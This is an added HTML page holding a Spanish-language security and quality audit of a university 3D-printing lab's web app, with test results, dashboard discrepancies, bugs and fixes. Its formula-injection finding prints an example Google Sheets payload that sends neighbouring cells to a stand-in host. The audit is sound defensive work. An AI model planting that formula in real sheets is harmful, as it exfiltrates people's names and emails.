@@ -1,0 +1,299 @@
+<style>
+  :root{
+    --bg:#f6f7fb; --card:#ffffff; --ink:#1e2440; --muted:#64748b; --line:#e7e9f2;
+    --accent:#4f46e5; --code:#eef0fe; --codeink:#3730a3;
+    --crit:#b91c1c; --critbg:#fef2f2; --critbd:#fecaca;
+    --alto:#c2410c; --altobg:#fff7ed; --altobd:#fed7aa;
+    --medio:#a16207; --mediobg:#fefce8; --mediobd:#fde68a;
+    --bajo:#3730a3; --bajobg:#eef2ff; --bajobd:#c7d2fe;
+    --ok:#0b7a53; --okbg:#e7f7f0; --okbd:#a7f3d0;
+  }
+  @media (prefers-color-scheme:dark){:root{
+    --bg:#0f1220; --card:#171a2b; --ink:#e6e8f2; --muted:#9aa1b8; --line:#2a2f45;
+    --accent:#a5b4fc; --code:#20263f; --codeink:#c7d2fe;
+    --crit:#fca5a5; --critbg:#2a1416; --critbd:#5b1d1d;
+    --alto:#fdba74; --altobg:#2a1a0e; --altobd:#5a3313;
+    --medio:#fcd34d; --mediobg:#292109; --mediobd:#5a4711;
+    --bajo:#c7d2fe; --bajobg:#1a1e34; --bajobd:#31396a;
+    --ok:#6ee7b7; --okbg:#0d2a20; --okbd:#155e45;
+  }}
+  :root[data-theme="light"]{--bg:#f6f7fb;--card:#fff;--ink:#1e2440;--muted:#64748b;--line:#e7e9f2;--accent:#4f46e5;--code:#eef0fe;--codeink:#3730a3;--crit:#b91c1c;--critbg:#fef2f2;--critbd:#fecaca;--alto:#c2410c;--altobg:#fff7ed;--altobd:#fed7aa;--medio:#a16207;--mediobg:#fefce8;--mediobd:#fde68a;--bajo:#3730a3;--bajobg:#eef2ff;--bajobd:#c7d2fe;--ok:#0b7a53;--okbg:#e7f7f0;--okbd:#a7f3d0;}
+  :root[data-theme="dark"]{--bg:#0f1220;--card:#171a2b;--ink:#e6e8f2;--muted:#9aa1b8;--line:#2a2f45;--accent:#a5b4fc;--code:#20263f;--codeink:#c7d2fe;--crit:#fca5a5;--critbg:#2a1416;--critbd:#5b1d1d;--alto:#fdba74;--altobg:#2a1a0e;--altobd:#5a3313;--medio:#fcd34d;--mediobg:#292109;--mediobd:#5a4711;--bajo:#c7d2fe;--bajobg:#1a1e34;--bajobd:#31396a;--ok:#6ee7b7;--okbg:#0d2a20;--okbd:#155e45;}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.55;font-size:15px}
+  .wrap{max-width:900px;margin:0 auto;padding:28px 20px 80px}
+  header.hero{background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;border-radius:16px;padding:24px 26px;margin-bottom:22px}
+  header.hero h1{margin:0 0 6px;font-size:24px;font-weight:800;letter-spacing:-.01em}
+  header.hero p{margin:0;color:#e0e7ff;font-size:13.5px}
+  header.hero .meta{margin-top:14px;display:flex;flex-wrap:wrap;gap:8px}
+  header.hero .meta span{background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.28);border-radius:999px;padding:3px 11px;font-size:12px;font-weight:600}
+  h2{font-size:19px;font-weight:800;margin:30px 0 4px;letter-spacing:-.01em;display:flex;align-items:center;gap:9px}
+  h2 .n{width:26px;height:26px;border-radius:8px;background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;display:grid;place-items:center;font-size:13px;flex:none}
+  .lead{color:var(--muted);font-size:13.5px;margin:0 0 14px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:13px;padding:15px 17px;margin:12px 0}
+  .f{border-left:4px solid var(--line)}
+  .f.crit{border-left-color:var(--crit)} .f.alto{border-left-color:var(--alto)} .f.medio{border-left-color:var(--medio)} .f.bajo{border-left-color:var(--bajo)}
+  .f h3{margin:0 0 6px;font-size:15.5px;font-weight:750;display:flex;align-items:center;gap:9px;flex-wrap:wrap}
+  .chip{font-size:10.5px;font-weight:800;text-transform:uppercase;letter-spacing:.04em;padding:2px 9px;border-radius:999px;border:1px solid;white-space:nowrap}
+  .chip.crit{color:var(--crit);background:var(--critbg);border-color:var(--critbd)}
+  .chip.alto{color:var(--alto);background:var(--altobg);border-color:var(--altobd)}
+  .chip.medio{color:var(--medio);background:var(--mediobg);border-color:var(--mediobd)}
+  .chip.bajo{color:var(--bajo);background:var(--bajobg);border-color:var(--bajobd)}
+  .chip.ok{color:var(--ok);background:var(--okbg);border-color:var(--okbd)}
+  .id{font-size:11px;color:var(--muted);font-weight:700;font-family:ui-monospace,Consolas,monospace}
+  .f p{margin:6px 0}
+  .f .impacto{color:var(--muted);font-size:13.5px}
+  .f .fix{font-size:13.5px}
+  .f .fix b{color:var(--accent)}
+  code,.loc{font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:12.5px;background:var(--code);color:var(--codeink);padding:1px 6px;border-radius:5px;word-break:break-word}
+  table{width:100%;border-collapse:collapse;margin:10px 0;font-size:13.5px;display:block;overflow-x:auto}
+  th,td{border:1px solid var(--line);padding:7px 10px;text-align:left;vertical-align:top}
+  th{background:var(--code);color:var(--codeink);font-weight:700;font-size:12.5px}
+  .kpi-row{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin:8px 0 4px}
+  .kpi{background:var(--card);border:1px solid var(--line);border-radius:11px;padding:12px 13px;text-align:center}
+  .kpi .v{font-size:24px;font-weight:800;line-height:1}
+  .kpi .l{font-size:11px;color:var(--muted);margin-top:5px;text-transform:uppercase;letter-spacing:.03em;font-weight:700}
+  .kpi.crit .v{color:var(--crit)} .kpi.alto .v{color:var(--alto)} .kpi.medio .v{color:var(--medio)} .kpi.bajo .v{color:var(--bajo)} .kpi.ok .v{color:var(--ok)}
+  .note{background:var(--bajobg);border:1px solid var(--bajobd);border-radius:11px;padding:12px 15px;font-size:13.5px;margin:12px 0}
+  ul{margin:6px 0;padding-left:20px} li{margin:3px 0}
+  @media(max-width:640px){.kpi-row{grid-template-columns:repeat(2,1fr)}}
+</style>
+
+<div class="wrap">
+  <header class="hero">
+    <h1>🔍 Reporte de auditoría — Aplicativo de Impresión 3D</h1>
+    <p>Pruebas dinámicas de la lógica · Comparación datos reales vs. Dashboard · Código sin usar · Fallas · Vulnerabilidades · Eficiencia</p>
+    <div class="meta">
+      <span>Aula STEAM · UNAL Medellín</span>
+      <span>22 jul 2026</span>
+      <span>Sin cambios aplicados al código</span>
+      <span>Datos de prueba</span>
+    </div>
+  </header>
+
+  <p class="lead">Se ejecutaron pruebas dinámicas end-to-end (crear/leer/editar/borrar/finalizar), se comparó el dato real de las hojas de Google contra las agregaciones del Dashboard, y se auditó el código con 4 revisiones independientes (código muerto, backend, seguridad, frontend). <b>No se aplicó ningún cambio</b>; toda escritura de prueba se hizo en modo demo (memoria) o se revirtió.</p>
+
+  <div class="card" style="border-left:4px solid var(--ok)">
+    <h3 style="margin:0 0 8px;font-size:15.5px;font-weight:750;display:flex;align-items:center;gap:9px;flex-wrap:wrap"><span class="chip ok">Actualización · 26 jul 2026</span> Estado de los hallazgos tras las correcciones</h3>
+    <p style="margin:6px 0;color:var(--muted);font-size:13.5px">Este reporte es la foto del <b>22 jul 2026</b>. Desde entonces se corrigieron varios puntos; los hallazgos se conservan abajo tal cual para dejar el registro histórico.</p>
+    <ul>
+      <li><span class="chip ok">Resuelto</span> <span class="id">S-01</span> Autenticación: se añadió protección por <b>clave de acceso</b> (<code>middleware.ts</code> + pantalla de login) en todas las páginas y en <code>/api/*</code>.</li>
+      <li><span class="chip ok">Resuelto</span> <span class="id">S-02</span> Inyección de fórmulas: se sanea todo texto escrito en los Sheets y exportado al <code>.xlsx</code> (<code>sanearCeldaHoja</code> en <code>lib/util.ts</code>).</li>
+      <li><span class="chip ok">Mitigado</span> <span class="id">S-03 · S-04</span> Relay de correo y borrados sin auth: quedan protegidos tras la clave de acceso (S-01).</li>
+      <li><span class="chip ok">Resuelto</span> <span class="id">D-01</span> Los KPIs de camas ahora <b>agrupan por código</b> (cuentan camas, no piezas).</li>
+      <li><span class="chip ok">Cambiado</span> <span class="id">D-02</span> El desperdicio ahora se guarda <b>por pieza</b> (o el total repartido equitativamente entre las piezas) y el tablero lo <b>suma</b>.</li>
+    </ul>
+    <p style="margin:6px 0;color:var(--muted);font-size:13.5px">El resto de hallazgos (medios/bajos, eficiencia y código sin usar) siguen pendientes de revisión.</p>
+  </div>
+
+  <div class="kpi-row">
+    <div class="kpi ok"><div class="v">8/8</div><div class="l">Pruebas ✔</div></div>
+    <div class="kpi crit"><div class="v">1</div><div class="l">Crítico</div></div>
+    <div class="kpi alto"><div class="v">4</div><div class="l">Alto</div></div>
+    <div class="kpi medio"><div class="v">9</div><div class="l">Medio</div></div>
+    <div class="kpi bajo"><div class="v">11</div><div class="l">Bajo/Info</div></div>
+  </div>
+
+  <!-- ============ 1. PRUEBAS ============ -->
+  <h2><span class="n">1</span> Pruebas dinámicas ejecutadas — todas pasaron</h2>
+  <p class="lead">La lógica central funciona correctamente. Verificado end-to-end contra la API real (lectura/creación/borrado revertido) y en modo demo (finalización + inventario, seguro).</p>
+  <div class="card">
+    <table>
+      <tr><th>Prueba</th><th>Resultado</th></tr>
+      <tr><td>Crear solicitud → leer campos → borrar (modo <b>real</b>)</td><td><span class="chip ok">OK</span> Round-trip correcto (correo, celular, rol, programa…), borrado sin rastro, hoja restaurada a 143.</td></tr>
+      <tr><td>Finalizar cama Exitoso + descuento de inventario (demo)</td><td><span class="chip ok">OK</span> FIL-002 2000→1840 g (descontó 160 = 150 pieza + 10 desperdicio), impresora +2 h, movimiento −160 g registrado, estado→Finalizada.</td></tr>
+      <tr><td>Idempotencia (re-finalizar)</td><td><span class="chip ok">OK</span> No volvió a descontar ni a sumar horas; advertencia correcta.</td></tr>
+      <tr><td>Filamento propio (sin descuento)</td><td><span class="chip ok">OK</span> Finalizó sin generar movimientos de inventario.</td></tr>
+      <tr><td>Editar cama (código + material) / Eliminar</td><td><span class="chip ok">OK</span> Sin rastro tras eliminar.</td></tr>
+      <tr><td>Conteos de solicitudes por estado: real vs Dashboard</td><td><span class="chip ok">OK</span> Coinciden exactamente (143; Nueva 4 · En Revisión 7 · Aprobada 40 · Rechazada 10 · Atendida 82).</td></tr>
+      <tr><td>Mapeo posicional de columnas (todas las hojas)</td><td><span class="chip ok">OK</span> Escritura ↔ lectura ↔ edición alineadas en las 6 hojas (incl. Mantenimiento A–K).</td></tr>
+      <tr><td>Costos de mantenimiento (por naturaleza/categoría/impresora)</td><td><span class="chip ok">OK</span> Suman al total ($1.029.804); segmentos del donut concilian.</td></tr>
+    </table>
+  </div>
+
+  <!-- ============ 2. DATOS vs DASHBOARD ============ -->
+  <h2><span class="n">2</span> Datos reales vs. Dashboard — discrepancias</h2>
+
+  <div class="card f alto">
+    <h3><span class="chip alto">Alto</span> Los KPIs de camas cuentan <em>piezas</em>, no camas <span class="id">D-01</span></h3>
+    <p class="loc">app/page.tsx (camActivas/camPausa ~L539-545; KPIs sección 1)</p>
+    <p>El Dashboard cuenta filas del historial. Una cama con N piezas produce N filas con el mismo estado, así que se sobrecuenta. <b>Confirmado con datos reales</b>: el tablero muestra <b>9 "Activas"</b> y <b>7 "En pausa"</b>, pero las camas reales agrupadas son <b>7</b> y <b>3</b> (la ventana "Camas de impresión" sí agrupa por código y muestra 7 y 3).</p>
+    <p class="impacto">Los KPIs "Material en curso" y "Horas en curso" sí son correctos (suman por pieza); solo los <b>conteos</b> están inflados.</p>
+    <p class="fix"><b>Sugerencia:</b> contar códigos distintos (<code>new Set(...map(h=>h.codigo)).size</code>). Requiere exponer <code>codigo</code> en <code>HistorialDash</code> (hoy no viaja al cliente).</p>
+  </div>
+
+  <div class="card f medio">
+    <h3><span class="chip medio">Medio</span> El "Desperdicio" del Dashboard subcuenta datos legados <span class="id">D-02</span></h3>
+    <p class="loc">lib/datastore.ts (dedup por código ~L528-538) · app/page.tsx (KPI Desperdicio)</p>
+    <p>El fix de desperdicio toma <em>un</em> valor por código (correcto para camas creadas por la app, que replican el mismo total a todas sus filas). Pero <b>25 códigos del historial tienen desperdicio distinto por fila</b> (datos legados donde cada fila era una pieza con su propio desperdicio). Ahí la deduplicación descarta valores reales: el tablero muestra <b>564,4 g</b> cuando la suma cruda por pieza es <b>964,6 g</b>.</p>
+    <p class="impacto">Métrica ambigua por mezcla de semánticas (por-pieza legado vs por-cama app). Para camas nuevas es correcto.</p>
+    <p class="fix"><b>Sugerencia:</b> definir una semántica única del desperdicio (por-cama) y normalizar los datos legados, o marcar/segregar el histórico previo a la app.</p>
+  </div>
+
+  <div class="card f bajo">
+    <h3><span class="chip bajo">Bajo</span> Filas anómalas en la hoja de Historial <span class="id">D-03</span></h3>
+    <p>4 filas no encajan en el ciclo de cama (Activa/En pausa/Finalizada): <code>chem e car</code> (código sin formato IMP), <b>2 filas con estado "Aprobada"</b> (un estado de solicitud, no de cama) y 1 con estado vacío. Al no ser "en curso", aparecen en la ventana Historial.</p>
+    <p class="fix"><b>Sugerencia:</b> limpiar esas filas y/o validar el estado al escribir en Historial (aceptar solo Activa/En pausa/Finalizada).</p>
+  </div>
+
+  <div class="card f bajo">
+    <h3><span class="chip bajo">Bajo</span> 7 mantenimientos migrados sin "Naturaleza" <span class="id">D-04</span></h3>
+    <p>Los 7 registros migrados de la tarea anterior (consumible/repuesto) quedaron con Naturaleza vacía; sus <b>$152.972</b> aparecen en el donut "Costo por naturaleza" como "(sin naturaleza)". Es el pendiente ya conocido: editarlos y marcar Preventivo/Correctivo.</p>
+  </div>
+
+  <!-- ============ 3. SEGURIDAD ============ -->
+  <h2><span class="n">3</span> Seguridad y vulnerabilidades</h2>
+  <p class="lead">Relevante <b>solo si el aplicativo se expone en internet</b> (el README documenta despliegue público en Vercel). En una red cerrada / localhost, el riesgo baja mucho.</p>
+
+  <div class="card f crit">
+    <h3><span class="chip crit">Crítico</span> Ningún endpoint de la API tiene autenticación <span class="id">S-01</span></h3>
+    <p class="loc">Todos los <code>app/api/**/route.ts</code> — no hay <code>middleware.ts</code> ni sesión/token.</p>
+    <p>Cualquiera que alcance el servidor puede: <b>leer todos los datos personales</b> (nombre, correo, celular, programa) vía <code>GET /api/solicitudes</code> o descargar todo con <code>POST /api/exportar</code>; y <b>crear/editar/borrar</b> solicitudes, camas, inventario y mantenimientos.</p>
+    <p class="impacto">Si se despliega en una URL pública de Vercel, es una fuga de datos personales (habeas data) y destrucción de datos con un simple <code>curl</code>.</p>
+    <p class="fix"><b>Sugerencia:</b> proteger con SSO (Vercel Password/Access, Cloudflare Access, o Google restringido a <code>@unal.edu.co</code>), o un <code>middleware.ts</code> que exija autenticación en <code>/</code> y <code>/api/*</code>. No confiar en "URL secreta".</p>
+  </div>
+
+  <div class="card f alto">
+    <h3><span class="chip alto">Alto</span> Inyección de fórmulas en Google Sheets <span class="id">S-02</span></h3>
+    <p class="loc">lib/google/sheets.ts (escribirRango / anexarFilas) — <code>valueInputOption:'USER_ENTERED'</code></p>
+    <p>El texto del usuario se escribe como si lo tecleara una persona: un valor que empiece con <code>=</code>, <code>+</code>, <code>-</code> o <code>@</code> se vuelve <b>fórmula viva</b>. Una descripción como <code>=IMPORTXML("https://malo/?d="&amp;CONCAT(A2:M2),"//a")</code> exfiltra celdas vecinas (nombres, correos) cuando un monitor abre la hoja.</p>
+    <p class="fix"><b>Sugerencia:</b> usar <code>valueInputOption:'RAW'</code> (los números ya se pasan como número, no se rompe nada) y/o prefijar con apóstrofo los valores que empiecen con <code>= + - @</code>.</p>
+  </div>
+
+  <div class="card f alto">
+    <h3><span class="chip alto">Alto</span> Relay de correo sin autenticación <span class="id">S-03</span></h3>
+    <p class="loc">app/api/email/route.ts → lib/email.ts → apps-script/Codigo.gs</p>
+    <p><code>POST /api/email</code> (sin auth) permite enviar un correo <b>desde el Gmail del aula</b> a cualquier destinatario con nombre/comentario/firma arbitrarios → spam/phishing con un remitente confiable <code>@unal.edu.co</code>, y agota la cuota de envío.</p>
+    <p class="fix"><b>Sugerencia:</b> lo resuelve la autenticación (S-01); además, limitar destinatarios y agregar rate-limit en el Apps Script.</p>
+  </div>
+
+  <div class="card f alto">
+    <h3><span class="chip alto">Alto</span> Destrucción / inyección de datos sin auth <span class="id">S-04</span></h3>
+    <p class="loc">DELETE de solicitudes, camas, inventario</p>
+    <p>Los <code>DELETE</code> borran filas/camas permanentemente sin autenticación (sin soft-delete ni auditoría). Combinado con S-02, se pueden inyectar filas con fórmulas vivas.</p>
+    <p class="fix"><b>Sugerencia:</b> autenticación (S-01); considerar borrado lógico / bitácora para recuperación.</p>
+  </div>
+
+  <div class="card f medio">
+    <h3><span class="chip medio">Medio</span> Token por defecto en el Apps Script <span class="id">S-05</span></h3>
+    <p class="loc">apps-script/Codigo.gs — <code>TOKEN_SECRETO = 'CAMBIE_ESTE_TOKEN...'</code></p>
+    <p>El Web App corre con "acceso: cualquiera". Si el operador no cambia el token (público en el repo), cualquiera que descubra la URL envía correo como el aula.</p>
+    <p class="fix"><b>Sugerencia:</b> que <code>doPost</code> rechace ejecutar mientras el token siga siendo el valor por defecto.</p>
+  </div>
+
+  <div class="card f medio">
+    <h3><span class="chip medio">Medio</span> Denegación de servicio (DoS) <span class="id">S-06 · S-07</span></h3>
+    <p>Sin auth ni rate-limit: (a) lecturas/escrituras y exportaciones repetidas agotan la cuota de Sheets (~60 lecturas/min) rompiendo la app; (b) el OCR puede sufrir <b>bomba de descompresión</b> — una imagen pequeña que decodifica a dimensiones enormes hace que Jimp reserve gigas (el límite de tamaño acota el archivo comprimido, no los píxeles decodificados).</p>
+    <p class="fix"><b>Sugerencia:</b> auth + rate-limit; rechazar imágenes cuyo <code>ancho×alto</code> exceda un tope (p. ej. &gt;40 MP) antes de escalar.</p>
+  </div>
+
+  <div class="card f bajo">
+    <h3><span class="chip bajo">Bajo</span> Mensajes de error crudos al cliente <span class="id">S-08</span></h3>
+    <p>Cada ruta devuelve <code>{ error: e.message }</code>, filtrando detalles internos (nombres de pestañas, IDs, errores de <code>googleapis</code>). No filtra la llave privada ni el token. Sugerencia: mensaje genérico al cliente + log en servidor.</p>
+  </div>
+
+  <div class="note">
+    <b>✔ Verificado seguro (sin problema):</b> XSS en el correo (todo dato de usuario pasa por <code>escapeHtml</code>; no hay <code>dangerouslySetInnerHTML</code>); inyección de fórmulas en el <b>.xlsx</b> exportado (ExcelJS guarda strings como texto, no fórmula); SSRF / open-redirect (el único <code>fetch</code> externo va a una URL de entorno, no del usuario); inyección de rangos A1 (los rangos se arman con nombres de pestaña de entorno + índices numéricos, nunca con texto del usuario); fuga de secretos (<code>.env.local</code> y <code>*.json</code> en <code>.gitignore</code>; sin <code>console.*</code>).
+  </div>
+
+  <!-- ============ 4. FALLAS DE LÓGICA ============ -->
+  <h2><span class="n">4</span> Fallas de lógica (bugs)</h2>
+
+  <div class="card f medio">
+    <h3><span class="chip medio">Medio</span> <code>num()</code> malinterpreta números con formato colombiano ≥ 1000 <span class="id">B-01</span></h3>
+    <p class="loc">lib/util.ts (num, ~L41-46) — lecturas con <code>FORMATTED_VALUE</code></p>
+    <p>Los números se leen como <em>texto mostrado</em>. Si una columna se formatea como Número/Moneda (muy común en "Costo (COP)"), <code>"45.000"</code> lo lee como <b>45</b> y <code>"1.234,56"</code> como <b>1.234</b> (solo reemplaza la primera coma). Corrompe totales de costo y aritmética de gramos.</p>
+    <p class="impacto">Latente: solo se dispara cuando un humano formatea la columna (la app escribe números crudos). Silencioso y de alto impacto cuando ocurre.</p>
+    <p class="fix"><b>Sugerencia:</b> hacer <code>num()</code> consciente del locale (quitar separadores de miles antes de convertir) o leer rangos numéricos con <code>UNFORMATTED_VALUE</code>.</p>
+  </div>
+
+  <div class="card f medio">
+    <h3><span class="chip medio">Medio</span> "Ninguno" vacía el tablero pero el chip del filtro se ve inactivo <span class="id">B-02</span></h3>
+    <p class="loc">app/page.tsx (FiltroMulti/FiltroMes: <code>activo = sel.size &gt; 0</code>)</p>
+    <p>Elegir "Ninguno" guarda un conjunto vacío → todo se muestra en blanco (comportamiento correcto), pero el botón del filtro se ve igual que "sin filtro" (sin contador), sin pista de qué causó el vacío.</p>
+    <p class="fix"><b>Sugerencia:</b> tratar el conjunto vacío como activo (<code>sel.size &lt; opciones.length</code>) y mostrar un "0" o estilo distinto.</p>
+  </div>
+
+  <div class="card f medio">
+    <h3><span class="chip medio">Medio</span> Los KPIs "En vivo" (sección 1) se ven afectados por el filtro de Mes <span class="id">B-03</span></h3>
+    <p class="loc">app/page.tsx (sección 1 usa <code>sol</code>/<code>hist</code> filtrados)</p>
+    <p>El mes de una cama es su mes de creación. Si filtras Mes = "Enero", una cama que <em>está imprimiendo ahora</em> (creada en mayo) desaparece y "Camas activas" marca 0 — contradice la etiqueta "En vivo" (la sección 4 sí ignora los filtros a propósito).</p>
+    <p class="fix"><b>Sugerencia:</b> calcular los KPIs de "estado actual" con datos sin filtrar (como la sección 4), o quitar el tag "En vivo" de esos tiles.</p>
+  </div>
+
+  <div class="card f medio">
+    <h3><span class="chip medio">Medio</span> "Material usado / Horas" incluyen camas en curso <span class="id">B-04</span></h3>
+    <p class="loc">app/page.tsx (sección 3: suma sobre todo <code>hist</code>)</p>
+    <p>"Tasa de éxito" se restringe a finalizadas, pero "Material usado (total impreso)" y "Horas (acumuladas)" suman también piezas Activa/En pausa (resultado "en curso"). Denominador mezclado; las etiquetas sobreestiman.</p>
+    <p class="fix"><b>Sugerencia:</b> sumar solo finalizadas, o aclarar en la etiqueta que incluye lo "en curso".</p>
+  </div>
+
+  <div class="card f bajo">
+    <h3><span class="chip bajo">Bajo</span> Otros de menor impacto <span class="id">B-05…B-09</span></h3>
+    <ul>
+      <li><b>Edición sin <code>archivos</code> borraría los enlaces</b> en modo real (el demo los preserva; hoy mitigado porque la UI reenvía el objeto completo). <span class="loc">sheets.ts vs demo.ts</span></li>
+      <li><b>Mes inconsistente Dashboard vs Export</b>: el Dashboard usa la marca temporal de la solicitud; el Export filtra por la fecha de creación de la cama. Misma cama, distinto mes según la vista.</li>
+      <li><b>"Últimos mantenimientos"</b> se ordena por inserción, no por fecha (un registro con fecha anterior ingresado después sale primero).</li>
+      <li><b>Filas sin fecha</b> se cuentan en KPIs pero se excluyen de los gráficos por mes → los totales no concilian.</li>
+      <li><b>"Top solicitantes"</b> agrupa por nombre crudo (sin normalizar): "Juan" y "Juan " se separan; homónimos exactos se funden.</li>
+    </ul>
+  </div>
+
+  <!-- ============ 5. EFICIENCIA ============ -->
+  <h2><span class="n">5</span> Mejoras de eficiencia</h2>
+
+  <div class="card f medio">
+    <h3><span class="chip medio">Medio</span> Lecturas del Dashboard no agrupadas <span class="id">E-01</span></h3>
+    <p class="loc">lib/datastore.ts (getDatosDashboard, Promise.all de 6 lecturas)</p>
+    <p>Filamentos, Umbrales, Impresoras y Mantenimiento son 4 lecturas separadas al <b>mismo</b> spreadsheet de inventario, cuando ya existe <code>leerVariosRangos</code> (batchGet) para traerlas en una sola. En caché frío el dashboard cuesta ~6 lecturas (la cuota es ~60/min).</p>
+    <p class="fix"><b>Sugerencia:</b> un lector combinado con <code>leerVariosRangos([...4 rangos])</code>.</p>
+  </div>
+
+  <div class="card f medio">
+    <h3><span class="chip medio">Medio</span> Escrituras N+1 al finalizar / cambiar estado <span class="id">E-02</span></h3>
+    <p class="loc">lib/google/sheets.ts (finalizarProyectoEnHistorial, actualizarEstadoProyecto) + finalize commit</p>
+    <p>Se escribe fila por fila en un bucle, y cada escritura invalida el caché global. Una cama de N piezas = N viajes secuenciales; el commit de finalización hace ~3R llamadas por rollo. La corrección está bien (idempotente); es lento y consume cuota.</p>
+    <p class="fix"><b>Sugerencia:</b> agrupar escrituras de mismo rango con <code>values.batchUpdate</code>; pre-leer filas de filamento una vez.</p>
+  </div>
+
+  <div class="card f medio">
+    <h3><span class="chip medio">Medio</span> Casi toda la agregación del Dashboard se recalcula en cada render <span class="id">E-03</span></h3>
+    <p class="loc">app/page.tsx (todo lo posterior al early-return está inline; solo <code>sol</code>/<code>hist</code> están memoizados)</p>
+    <p><code>countBy</code>×6, <code>sumBy</code>×3, <code>porMes</code>×2, <code>calcularAlertasMantenimiento</code> (O(impresoras×mantenimientos)), ordenamientos… se recomputan al abrir/cerrar un popover de filtro y en cada polling de 60 s.</p>
+    <p class="fix"><b>Sugerencia:</b> envolver los derivados en <code>useMemo</code> con clave <code>[datos, filtros]</code> para que el estado del popover no los invalide. (Impacto práctico bajo a la escala actual de datos.)</p>
+  </div>
+
+  <div class="card f bajo">
+    <h3><span class="chip bajo">Bajo</span> Lecturas de columna completa y metadata por operación <span class="id">E-04</span></h3>
+    <p>Cada guardado de filamento/impresora/umbral lee toda la columna de IDs para ubicar una fila; cada borrado pide la metadata del libro para resolver el <code>sheetId</code>. Memoizable (el mapa título→sheetId es estable).</p>
+  </div>
+
+  <!-- ============ 6. CÓDIGO SIN USAR ============ -->
+  <h2><span class="n">6</span> Código sin usar</h2>
+  <p class="lead">El código está <b>notablemente limpio</b>: sin imports sin usar y sin dependencias npm sin usar. Hallazgos menores:</p>
+
+  <div class="card">
+    <table>
+      <tr><th>Hallazgo</th><th>Ubicación</th><th>Acción</th></tr>
+      <tr><td><b>Campo <code>Solicitud.contacto</code></b> — se escribe en 5 sitios, se lee en 0 (duplica <code>correo</code>; legado de cuando C era "correo y número")</td><td>lib/types.ts:16</td><td><span class="chip medio">Revisar</span></td></tr>
+      <tr><td><b>8 <code>export</code> innecesarios</b> (símbolo usado solo dentro de su módulo): <code>asegurarInventario</code>, <code>store</code>, <code>ResultadoCrearFilamento</code>, <code>ResultadoCrearUmbral</code>, <code>MARGEN_PROXIMIDAD_UMBRAL</code>, <code>CATALOGOS_DASHBOARD</code>, <code>DIAS_AVISO_MANTENIMIENTO</code>, <code>TipoMaterial</code></td><td>sheets.ts, demo.ts, datastore.ts, util.ts, types.ts</td><td><span class="chip ok">Seguro</span> (quitar solo la palabra <code>export</code>)</td></tr>
+      <tr><td><b>Props sin uso</b>: <code>Combobox</code> <code>id</code>/<code>className</code>; <code>ModalConfirmarCambios</code> <code>extra</code> (ningún llamador los pasa)</td><td>components/ui.tsx</td><td><span class="chip ok">Seguro</span></td></tr>
+      <tr><td><b>Helpers duplicados</b>: <code>valorParaVariable</code> vs <code>valorVar</code>; <code>fechaAISO</code> vs <code>fechaISO</code></td><td>datastore.ts, util.ts</td><td><span class="chip medio">Revisar</span> (consolidar)</td></tr>
+      <tr><td><b>Rama <code>agregarItemsProyecto</code></b> inalcanzable desde la UI (la edición siempre usa <code>editar:true</code> → <code>editarProyecto</code>)</td><td>datastore.ts / route [codigo]</td><td><span class="chip medio">Revisar</span></td></tr>
+    </table>
+  </div>
+
+  <!-- ============ PRIORIZACIÓN ============ -->
+  <h2><span class="n">7</span> Priorización sugerida</h2>
+  <div class="card">
+    <ol>
+      <li><b>Si se va a exponer en internet:</b> autenticación (S-01) + escrituras <code>RAW</code> en Sheets (S-02) + rechazar el token por defecto (S-05). Si solo corre en localhost/red cerrada, baja mucho la urgencia.</li>
+      <li><b>Corrección visible:</b> el conteo de camas por piezas (D-01) infla un KPI de portada — arreglo de alto valor y bajo riesgo.</li>
+      <li><b>Robustez de datos:</b> <code>num()</code> con formato colombiano (B-01) y limpiar las 4 filas anómalas (D-03) + completar naturaleza de los 7 migrados (D-04).</li>
+      <li><b>Pulido:</b> filtro "Ninguno" (B-02), "En vivo" vs filtros (B-03), memoización del dashboard (E-03).</li>
+      <li><b>Limpieza opcional:</b> los 8 <code>export</code> y props sin uso (sección 6).</li>
+    </ol>
+  </div>
+
+  <p class="lead" style="margin-top:24px;text-align:center">Auditoría de solo lectura. <b>No se aplicó ningún cambio al aplicativo.</b> Todas las escrituras de prueba fueron en modo demo o revertidas.</p>
+</div>
